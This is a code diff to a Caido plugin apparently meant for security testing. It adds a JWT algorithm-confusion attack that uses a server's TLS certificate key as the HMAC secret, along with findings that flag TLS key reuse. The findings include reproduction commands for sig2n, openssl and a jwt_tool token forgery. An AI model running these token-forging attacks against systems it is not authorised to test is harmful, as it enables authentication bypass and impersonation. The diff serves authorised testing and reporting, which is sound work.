@@ -1,8 +1,13 @@
+// Safeguard: install TextEncoder/TextDecoder if the runtime lacks them (LLRT
+// does). Must be first so any later module that uses them at import time is safe.
+import "./crypto/textCodecPolyfill.js";
 import { SDK, DefineAPI, DefineEvents } from "caido:plugin";
 import { RequestSpec } from "caido:utils";
 
 import { parseJWT, getAlgorithmFamily, verifyRS256WithJWK } from "./crypto/jwt.js";
-import { generateRSAKeyPair, buildJWKSDocument, bigintToPublicKeyPem, type RSAKeyPair } from "./crypto/rsa.js";
+import { generateRSAKeyPair, buildJWKSDocument, bigintToPublicKeyPem, x509CertToPublicKeyPem, type RSAKeyPair } from "./crypto/rsa.js";
+import { fetchTlsPublicKey, type TlsPublicKey } from "./crypto/tlsConnect.js";
+import { publicKeyPemToModulusHex } from "./crypto/tlsCert.js";
 // NOTE: RSA key recovery (gmp-wasm) runs in the FRONTEND — the backend runtime
 // has no WebAssembly. The backend only collects candidate JWTs and launches the
 // confusion attack with the frontend-recovered key (see runRecoveredConfusion).
@@ -60,6 +65,7 @@ export type BackendEvents = DefineEvents<{
     sessionId: string;
     requestId: string;
     originalJWT: string;
+    tlsModulusHex: string | null; // server's TLS cert RSA modulus, for key-reuse comparison
     candidates: Array<{ alg: string; headerB64: string; payloadB64: string; signatureB64: string }>;
   }) => void;
 }>;
@@ -251,6 +257,10 @@ async function attackJwt(
       }
     }
 
+    // The web server's TLS certificate public key (fetched once for algorithm
+    // confusion + later key-reuse comparison). Kept for the recovery comparison.
+    let tlsKey: TlsPublicKey | null = null;
+
     if (cfg.enabledAttacks.algConfusion) {
       const isAsym = /^(RS|PS|ES)/.test(parsed.header.alg as string);
       if (!isAsym) {
@@ -281,6 +291,53 @@ async function attackJwt(
             ? `Algorithm confusion: found ${foundCount} key endpoint(s) — see the cyan banner.`
             : `Algorithm confusion: no exposed JWKS/cert endpoints found on ${request.getHost()} (expected for "no exposed key" targets — use key recovery).`,
         });
+
+        // Additionally: fetch the web server's TLS certificate public key and try
+        // algorithm confusion with it (servers sometimes reuse the TLS key for JWTs).
+        if (request.getTls()) {
+          sdk.api.send("jwt-key-recovery-progress", {
+            sessionId,
+            message: "Algorithm confusion: fetching the web server's TLS certificate public key…",
+          });
+          try {
+            tlsKey = await fetchTlsPublicKey(
+              request.getHost(),
+              request.getPort(),
+              (m) => sdk.api.send("jwt-key-recovery-progress", { sessionId, message: `[TLS] ${m}` })
+            );
+          } catch { tlsKey = null; }
+          if (tlsKey?.publicKeyPem) {
+            sdk.api.send("jwt-key-recovery-progress", {
+              sessionId,
+              message: `Algorithm confusion: got the TLS public key${tlsKey.nHex ? ` (RSA, ${tlsKey.nHex.length * 4}-bit)` : " (non-RSA)"} — trying it as the HMAC secret.`,
+            });
+            const tlsAttacks = buildAlgConfusionForKeys(parsed, [tlsKey.publicKeyPem], "webserver TLS certificate");
+            attacks.push(...tlsAttacks);
+          } else {
+            sdk.api.send("jwt-key-recovery-progress", {
+              sessionId,
+              message: "Algorithm confusion: could not auto-fetch the TLS certificate (raw socket blocked in this runtime). " +
+                "Paste it into Configuration → Certificate to use it (get it via: openssl s_client -connect HOST:443 -servername HOST </dev/null | openssl x509).",
+            });
+          }
+        }
+
+        // Manual fallback: if the raw-socket TLS fetch didn't work but the analyst
+        // pasted the server's certificate into Configuration → Certificate, use it
+        // as the TLS key (for the confusion attack AND the key-reuse comparison).
+        if (!tlsKey?.publicKeyPem && cfg.customCertPem) {
+          try {
+            const pem = x509CertToPublicKeyPem(cfg.customCertPem);
+            tlsKey = { publicKeyPem: pem, nHex: publicKeyPemToModulusHex(pem) };
+            sdk.api.send("jwt-key-recovery-progress", {
+              sessionId,
+              message: `Algorithm confusion: using the configured Certificate as the web server's TLS key${tlsKey.nHex ? ` (RSA, ${tlsKey.nHex.length * 4}-bit)` : ""}.`,
+            });
+            attacks.push(...buildAlgConfusionForKeys(parsed, [pem], "configured TLS certificate"));
+          } catch (e) {
+            sdk.api.send("jwt-key-recovery-progress", { sessionId, message: `Could not parse the configured Certificate: ${(e as Error).message}` });
+          }
+        }
       }
     }
 
@@ -482,6 +539,45 @@ async function attackJwt(
 
     await runBypassFindings(attacks);
 
+    // ── TLS public-key finding ────────────────────────────────────────────────
+    // The server accepted a JWT HMAC-signed with its TLS certificate PUBLIC key
+    // (algorithm confusion using the TLS key worked).
+    if (sigValidated && tlsKey?.publicKeyPem) {
+      const hit = attacks.find(
+        (a) => a.keyPem === tlsKey!.publicKeyPem && !a.infoOnly && !a.error && matchesBaseline(a)
+      );
+      const sent = hit ? (sentById.get(hit.id) as { request?: { getHost(): string; getPath(): string } } | undefined) : undefined;
+      if (hit && sent?.request) {
+        const fullTok = (j: ParsedJWT) => `${j.headerB64}.${j.payloadB64}.${j.signatureB64}`;
+        const jwt1 = recoveryCandidates[0] ? fullTok(recoveryCandidates[0]) : "<JWT-token1>";
+        const jwt2 = recoveryCandidates[1] ? fullTok(recoveryCandidates[1]) : "<JWT-token2>";
+        const title = "JWT signed using webserver's TLS public key";
+        try {
+          await sdk.findings.create({
+            title,
+            reporter: "JWT Attacker",
+            dedupeKey: `jwt-attacker:tls-public-key:${sent.request.getHost()}${sent.request.getPath()}`,
+            request: sent.request as unknown as Parameters<typeof sdk.findings.create>[0]["request"],
+            description:
+              `**${title}.**\n\n` +
+              "The server accepts JWTs HMAC-signed (HS256) with its TLS certificate **public** key — its JWT " +
+              "verification key is the TLS public key and it is vulnerable to algorithm confusion. Because the TLS " +
+              "public key is available to anyone (it's in the server's certificate), an attacker can forge arbitrary " +
+              "tokens (e.g. elevated claims) with no secret material.\n\n" +
+              "**REPRODUCE WITH SIG2N and JWT_TOOL:**\n\n```\n" +
+              buildTlsCompareRepro({
+                host: request.getHost(), port: request.getPort(), jwt1, jwt2,
+                b64x509: pemToB64(tlsKey.publicKeyPem), originalJWT, includeForge: true,
+              }) +
+              "\n```",
+          });
+          sdk.api.send("jwt-key-recovery-progress", { sessionId, message: `Finding created: "${title}".` });
+        } catch (e) {
+          errors.push(`[finding] ${(e as Error).message}`);
+        }
+      }
+    }
+
     // ── Second wave: RSA public-key recovery from same-host HTTP history ──────
     // The backend runtime has NO WebAssembly, so gmp-wasm can't run here. We hand
     // the candidate JWTs to the FRONTEND, which recovers the key with gmp-wasm and
@@ -507,6 +603,7 @@ async function attackJwt(
           sessionId,
           requestId,
           originalJWT,
+          tlsModulusHex: tlsKey?.nHex ?? null,
           candidates: historyJWTs.map((j) => ({
             alg: j.header.alg as string,
             headerB64: j.headerB64,
@@ -541,6 +638,21 @@ async function getJWTsInRequest(
 // Generate a fresh RSA spoofing key pair and the matching JWKS document to host.
 // The private key signs spoofed (jku/x5u) tokens; the JWKS exposes the public
 // key under SPOOF_KID, so the two are guaranteed consistent.
+// Diagnostic: fetch example.com's TLS certificate via the LLRT `net` module, so
+// the analyst can confirm the cert-fetch transport works in their runtime.
+async function netSelfTest(_sdk: SDK<API, BackendEvents>): Promise<{ message: string }> {
+  const out: string[] = [];
+  try {
+    const key = await fetchTlsPublicKey("example.com", 443, (m) => out.push(`  ${m}`));
+    out.push(key
+      ? `✓ Fetched example.com TLS cert — public key ${key.nHex ? `RSA ${key.nHex.length * 4}-bit` : "(non-RSA)"}.`
+      : "✗ Could not fetch example.com's certificate (see lines above).");
+  } catch (e) {
+    out.push(`✗ net test threw: ${(e as Error).message}`);
+  }
+  return { message: out.join("\n") };
+}
+
 async function generateSpoofKeyPair(
   _sdk: SDK<API, BackendEvents>
 ): Promise<{ privateKeyPem: string; jwksJson: string }> {
@@ -560,8 +672,9 @@ async function runRecoveredConfusion(
   opts?: {
     baselineStatus?: number;
     baselineLength?: number;
-    sigValidated?: boolean;   // server rejects invalid signatures (baseline ≠ invalid-sig)
-    candidateJwts?: string[]; // the JWTs recovery used — for the sig2n repro command
+    sigValidated?: boolean;       // server rejects invalid signatures (baseline ≠ invalid-sig)
+    candidateJwts?: string[];     // the JWTs recovery used — for the sig2n repro command
+    tlsModulusHex?: string | null; // server's TLS cert RSA modulus — for key-reuse detection
   }
 ): Promise<{ ok: boolean; count: number; pems: string[] }> {
   if (!keys.length) return { ok: false, count: 0, pems: [] };
@@ -574,6 +687,49 @@ async function runRecoveredConfusion(
   const loc = locations[0];
   const parsed = parseJWT(loc.jwt);
   const originalJWT = loc.jwt;
+  const req = reqResp.request as unknown as { getHost(): string; getPort(): number; getPath(): string };
+
+  // ── TLS private-key reuse finding ─────────────────────────────────────────
+  // A recovered modulus that equals the server's TLS certificate modulus means
+  // the JWTs are produced with the server's TLS PRIVATE key. Raised regardless of
+  // whether algorithm confusion is exploitable.
+  if (opts?.tlsModulusHex) {
+    const match = keys.find((k) => normalizeHex(k.nHex) === normalizeHex(opts.tlsModulusHex));
+    if (match) {
+      const jwt1 = opts.candidateJwts?.[0] ?? "<JWT-token1>";
+      const jwt2 = opts.candidateJwts?.[1] ?? "<JWT-token2>";
+      const b64 = pemToB64(bigintToPublicKeyPem(BigInt("0x" + match.nHex), BigInt(match.e)));
+      const title = "JWT signed using webserver's TLS private key";
+      try {
+        await sdk.findings.create({
+          title,
+          reporter: "JWT Attacker",
+          dedupeKey: `jwt-attacker:tls-private-key:${req.getHost()}${req.getPath()}`,
+          request: reqResp.request as unknown as Parameters<typeof sdk.findings.create>[0]["request"],
+          description:
+            `**${title}.**\n\n` +
+            "The RSA public key recovered from the JWTs matches the web server's TLS certificate public key. " +
+            "Because RS256 tokens are produced with the PRIVATE key, the server is signing JWTs with its " +
+            "**TLS private key**.\n\n" +
+            "**Risk — TLS confidentiality & integrity:** the TLS private key is now used outside the TLS stack, " +
+            "behind a weaker boundary (the JWT-signing service). If that key is exposed or compromised via the " +
+            "JWT path, an attacker who obtains it can, from a **Machine-in-the-Middle (MITM)** position, decrypt " +
+            "and tamper with ALL TLS traffic to this server — breaking both the confidentiality and integrity of " +
+            "every TLS session — as well as forge arbitrary JWTs. A TLS private key must be unique to TLS and " +
+            "never reused for application token signing; rotate the TLS certificate/key and use a separate key " +
+            "for JWTs.\n\n" +
+            "**REPRODUCE WITH SIG2N and JWT_TOOL:**\n\n```\n" +
+            buildTlsCompareRepro({
+              host: req.getHost(), port: req.getPort(), jwt1, jwt2, b64x509: b64, originalJWT, includeForge: true,
+            }) +
+            "\n```",
+        });
+        sdk.api.send("jwt-key-recovery-progress", { sessionId, message: `Finding created: "${title}".` });
+      } catch (e) {
+        sdk.console.log(`[JWT Attacker] tls-private-key finding failed: ${(e as Error).message}`);
+      }
+    }
+  }
 
   const extra = buildAlgConfusionForKeys(parsed, pems, "recovered from HTTP history (frontend gmp-wasm)");
   for (const a of extra) if (!a.originalJWT) a.originalJWT = originalJWT;
@@ -661,6 +817,45 @@ function jwksContainsKey(hostedRaw: string, expectedRaw: string): boolean {
   } catch {
     return false;
   }
+}
+
+// Normalise an RSA modulus hex string for comparison (strip leading zeros, lower).
+function normalizeHex(h: string | null | undefined): string {
+  if (!h) return "";
+  return h.toLowerCase().replace(/^0+/, "");
+}
+
+// PEM public key → its base64 X.509 (SPKI) body, i.e. what `base64 -d` expects.
+function pemToB64(pem: string): string {
+  return pem.replace(/-----[^-]+-----/g, "").replace(/\s+/g, "");
+}
+
+// Build the sig2n + openssl repro showing how to recover the JWT key and compare
+// it to the server's TLS certificate public key.
+function buildTlsCompareRepro(o: {
+  host: string; port: number; jwt1: string; jwt2: string; b64x509: string; originalJWT: string; includeForge: boolean;
+}): string {
+  const lines = [
+    "# Recover the JWT signing public key from two captured JWTs (silentsignal rsa_sign2n):",
+    `docker run --rm -it portswigger/sig2n ${o.jwt1} ${o.jwt2}`,
+    "# sig2n prints base64 X.509 key(s); write the matching one to a file:",
+    `echo -n ${o.b64x509} | base64 -d > /tmp/recoveredkey`,
+    "",
+    "# Extract the web server's TLS certificate public key (SPKI DER):",
+    `openssl s_client -connect ${o.host}:${o.port} -servername ${o.host} </dev/null 2>/dev/null \\`,
+    "  | openssl x509 -pubkey -noout | openssl pkey -pubin -outform DER > /tmp/tlskey.der",
+    "",
+    "# Compare — identical files prove the JWTs are signed with the server's TLS key:",
+    "cmp /tmp/recoveredkey /tmp/tlskey.der && echo 'MATCH: JWT key == server TLS key'",
+  ];
+  if (o.includeForge) {
+    lines.push(
+      "",
+      "# Forge a token via algorithm confusion using that key as the HMAC secret:",
+      `python3 jwt_tool.py ${o.originalJWT} -X k -pk /tmp/recoveredkey`,
+    );
+  }
+  return lines.join("\n");
 }
 
 // Title used for the "forged token accepted" finding, per technique.
@@ -1014,6 +1209,7 @@ export type API = DefineAPI<{
   getJWTsInRequest: typeof getJWTsInRequest;
   generateSpoofKeyPair: typeof generateSpoofKeyPair;
   runRecoveredConfusion: typeof runRecoveredConfusion;
+  netSelfTest: typeof netSelfTest;
 }>;
 
 export function init(sdk: SDK<API, BackendEvents>): void {
@@ -1022,5 +1218,6 @@ export function init(sdk: SDK<API, BackendEvents>): void {
   sdk.api.register("getJWTsInRequest", getJWTsInRequest);
   sdk.api.register("generateSpoofKeyPair", generateSpoofKeyPair);
   sdk.api.register("runRecoveredConfusion", runRecoveredConfusion);
+  sdk.api.register("netSelfTest", netSelfTest);
   sdk.console.log("[JWT Attacker] backend init() complete");
 }
